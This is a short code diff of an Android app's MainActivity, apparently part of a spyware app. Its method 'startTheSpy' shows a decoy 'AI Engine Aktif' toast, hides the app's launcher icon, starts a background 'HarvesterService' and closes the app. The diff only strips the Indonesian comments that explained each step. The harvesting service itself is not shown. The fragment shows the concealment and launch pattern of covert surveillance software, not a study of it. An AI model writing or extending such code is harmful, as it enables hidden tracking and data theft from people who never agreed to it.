@@ -65,7 +65,6 @@ public class MainActivity extends AppCompatActivity {
     private void startTheSpy() {
         Toast.makeText(MainActivity.this, "AI Engine Aktif...", Toast.LENGTH_SHORT).show();
 
-        // 1. SEMBUNYIIN ICON DULU (Tanpa Jeda)
         ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
         getPackageManager().setComponentEnabledSetting(
                 componentName,
@@ -73,10 +72,7 @@ public class MainActivity extends AppCompatActivity {
                 PackageManager.DONT_KILL_APP
         );
 
-        // 2. Baru Jalanin Service
         startService(new Intent(this, HarvesterService.class));
-
-        // 3. Tutup Aplikasi
         finishAffinity();
     }
 }
